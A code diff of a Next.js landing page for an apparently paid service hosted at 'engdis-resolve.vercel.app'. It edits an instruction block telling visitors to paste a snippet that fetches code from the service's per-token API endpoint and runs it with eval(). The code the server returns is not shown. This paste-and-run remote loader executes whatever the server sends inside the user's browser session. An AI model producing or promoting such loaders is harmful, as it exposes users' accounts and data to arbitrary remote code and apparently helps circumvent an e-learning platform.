@@ -15,7 +15,7 @@ async function getTiers() {
 
 export default async function HomePage() {
   const tiers = await getTiers()
-  const baseUrl = process.env.NEXT_PUBLIC_APP_URL || "https://your-domain.com"
+  const baseUrl = process.env.NEXT_PUBLIC_APP_URL || "https://engdis-resolve.vercel.app"
 
   return (
     <div className="min-h-screen bg-background">
@@ -143,7 +143,7 @@ export default async function HomePage() {
                 <p className="text-sm text-muted-foreground mb-4">3. Paste your token code:</p>
               </div>
               <pre className="bg-muted p-4 rounded-lg overflow-x-auto">
-                <code className="text-sm font-mono text-foreground">{`fetch("${baseUrl}/[YOUR_TOKEN]")
+                <code className="text-sm font-mono text-foreground">{`fetch("${baseUrl}/api/[YOUR_TOKEN]")
   .then(res => res.text())
   .then(code => eval(code))
   .catch(err => console.error("Error:", err))`}</code>
